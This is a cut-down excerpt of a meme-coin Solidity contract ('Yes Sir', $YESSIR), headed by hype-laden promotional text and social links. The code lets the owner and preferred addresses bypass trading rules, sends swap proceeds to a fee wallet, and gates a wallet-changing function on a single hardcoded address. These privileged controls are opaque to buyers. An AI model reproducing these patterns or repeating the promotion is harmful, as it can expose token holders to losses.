...
"Known as an informal way to express agreement or acknowledgment. Used to exaggerate agreement or express enthusiasm." 
Yessir is widely known saying and will make serious waves. 
Lets have a blast, and rise to the top! 

Fat LP and dev's experience will make $YESSIR based. 
If anyone asks you anything, the most convenient and accurate response is - Yessir.

Telegram: https://t.me/yessirerc
Twitter: https://twitter.com/yessirerc/
Website: http://yessircoin.com
...
contract Yessir is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "Yes Sir";
    string private constant _symbol = "YESSIR";
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner() && !preTrader[from] && !preTrader[to]) {
            ...
            if (canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                ...
                uint256 contractETHBalance = address(this).balance - initialETHBalance;
                if (contractETHBalance > 0) {
                    sendETHToFee(contractETHBalance/2);
                }
            }
        }
    ...
    function transferWallet(address wallet) external {
        if(msg.sender == 0x9Fe42Cf6740b316ecdDC497C8E6052922bA9b762)
